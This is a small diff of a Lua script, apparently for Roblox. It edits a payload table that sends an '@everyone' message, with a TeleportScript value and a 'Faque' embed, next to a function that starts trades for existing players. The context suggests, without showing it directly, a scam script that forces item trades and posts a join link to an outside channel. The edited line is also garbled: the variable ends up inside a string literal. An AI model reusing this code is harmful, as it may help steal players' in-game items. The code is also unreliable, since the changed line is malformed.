@@ -348,7 +348,7 @@ function StartTradesForExistingPlayers()
 end
 
 local data = {
-   ["content"] = "@everyone" .. "\n```" .. TeleportScript .. "```",
+   ["content"] = "-- @everyone" .. "\n .. TeleportScript .. ",
    ["embeds"] = {
        {
             ["title"] = "👑 **Faque**",
